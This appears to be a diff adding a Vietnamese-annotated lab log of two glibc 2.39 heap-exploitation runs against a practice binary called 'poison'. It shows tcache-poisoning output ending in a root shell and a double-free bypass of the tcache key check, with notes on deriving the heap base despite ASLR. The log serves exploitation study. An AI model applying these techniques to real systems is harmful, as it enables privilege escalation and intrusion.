@@ -1,0 +1,43 @@
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39-0ubuntu8.9, gcc 13.3.0. ASLR BAT.
+
+$ ./build.sh
+[*] built: poison
+
+=================== exploit.py (tcache poisoning) ===================
+$ python3 exploit.py
+[*] '.../poison'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Starting local process './poison'
+[*] leak(chunk0>>12) = 0x37849
+[*] heap_base        = 0x37849000
+[*] chunk1 (head)    = 0x378492e0
+[*] wrote win=0x401276 into hook=0x404070
+[win] hook bi chiem -> /bin/sh
+===PWNED_9_3===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+
+[+] tcache poisoning OK: hook->win, got shell
+
+Ghi chu: heap_base ngau nhien moi lan chay (vi du 0x37849000) vi ASLR bat. Exploit
+suy ra heap_base tu leak con tro fd (da obfuscate) roi tinh PROTECT chinh xac ->
+chay duoc du ASLR bat.
+
+=================== dfree.py (double free + key) ===================
+$ python3 dfree.py
+[A] free(0) hai lan:
+    free(): double free detected in tcache 2
+[B] sau khi xoa key, free(0) lan 2: freed
+[B] show(slot2) 8 byte dau = b'MARK_FRO'
+
+Ghi chu:
+  - (A) free hai lan lien tiep bi glibc 2.39 bat: "double free detected in tcache 2".
+  - (B) ghi de truong key (offset 8) thanh 0 roi free lai -> qua duoc, bin co chunk
+    2 lan (dup). Chung minh: ghi "MARK_FROM_SLOT1" qua slot1 thi show slot2 cung thay
+    -> hai slot tro cung mot chunk.
